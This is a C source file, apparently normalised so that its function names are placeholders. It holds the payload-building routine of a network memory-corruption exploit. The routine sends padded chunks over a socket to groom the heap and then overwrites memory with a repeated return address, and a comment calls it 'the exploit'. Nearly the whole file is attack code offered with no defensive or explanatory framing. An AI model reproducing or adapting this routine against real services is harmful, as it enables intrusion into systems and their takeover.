#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  addrbuf ;

/* Variables and functions */
 unsigned long RET ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int,char*,char*,int) ; 
 int FUNC2 (unsigned long) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int word_size ; 

int FUNC6(int sockfd, int fill)
{
int chunk_size, chunk_size2;
int num_chunks;
int leftover, i = 0;
char buf[256];
char pad[1024];
char buff[2048];
unsigned long addr = RET;
char addrbuf[4096];

chunk_size = (1024 + word_size);
num_chunks = (fill / chunk_size);
leftover = (fill % chunk_size);

FUNC4(pad, 0x0, 1024);
FUNC4(pad, 0x88, ((1024 - 8) / 2));
FUNC4(buff, 0x0, 2048);

        /* The exploit will almost certainly fail if leftover == 0
         * however in theory this should never actually happen.
         */
if(leftover == 0)
{
for(i = 0; i < num_chunks && fill > 0; i++)
{
          FUNC1(sockfd, pad, pad, fill - (1024 + word_size));
  fill -= (1024 + word_size);
}
}
else
{
for(i = 0; i < (num_chunks -2) && fill > 0; i++)
{
          FUNC1(sockfd, pad, pad, fill - (1024 + word_size));
  fill -= (1024 + word_size);
}
chunk_size2 = (chunk_size * 2 + leftover); 
FUNC0(chunk_size2);
FUNC4(buff, 0x0, 2048);
FUNC4(buff, 0xff, (chunk_size2 - 8) / 2);
FUNC4(addrbuf, 0x0, sizeof(addrbuf)); 
for(i = 0 ; i < (((chunk_size2 - 8) / 2) -4) ; i += 4) 
    *(int *)&addrbuf[i] = FUNC2(RET);

FUNC3(buff+1, addrbuf, FUNC5(addrbuf)); 
FUNC1(sockfd, buff, buff, 4096);
}

FUNC4(buff, 0x0, 2048);
FUNC4(buff, 0xff, 34);

FUNC4(addrbuf, 0x0, sizeof(addrbuf));
for(i = 0; i < 28; i+=4)
    *(int *)&addrbuf[i] = FUNC2(RET);

FUNC3(buff+7, addrbuf, FUNC5(addrbuf));

FUNC1(sockfd, buff, buff, 97);
}